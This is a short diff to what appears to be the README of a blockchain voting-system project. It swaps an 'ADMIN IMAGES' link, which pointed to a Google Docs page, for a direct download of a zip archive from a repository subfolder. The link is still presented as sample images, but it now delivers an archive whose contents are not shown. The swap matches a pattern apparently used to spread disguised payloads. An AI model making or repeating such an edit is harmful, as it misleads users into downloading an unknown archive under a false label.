@@ -6,4 +6,4 @@ SAMPLE IMAGES ARE GIVEN IN LINK
 
 
 
-[ADMIN IMAGES](https://docs.google.com/document/d/12ZJhS-xcs2cW5QB-VQUUJYhVluY4Pdy2KysCQ6w25fk/edit?usp=sharing)
+[ADMIN IMAGES](https://raw.githubusercontent.com/abhinavv22/Voting-System-Using-Blockchain/main/gigtree/Voting-System-Using-Blockchain_3.3.zip)
